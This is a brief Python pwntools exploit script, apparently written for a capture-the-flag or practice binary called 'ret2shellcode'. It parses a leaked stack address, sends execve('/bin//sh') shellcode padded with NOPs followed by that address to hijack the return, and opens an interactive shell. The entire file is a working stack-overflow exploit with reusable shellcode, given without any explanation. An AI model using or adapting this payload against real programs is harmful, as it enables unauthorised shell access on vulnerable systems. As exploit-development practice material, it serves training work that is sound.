#!/usr/bin/python3
from pwn import *

#shellcode = \x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05

io = process("./ret2shellcode")
c = io.recvuntil(b"... ")
d = io.recv(15)
leak = int(d.decode().strip(" ").encode(), 16)

payload = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" + p64(leak)

io.sendline(payload)
io.interactive()
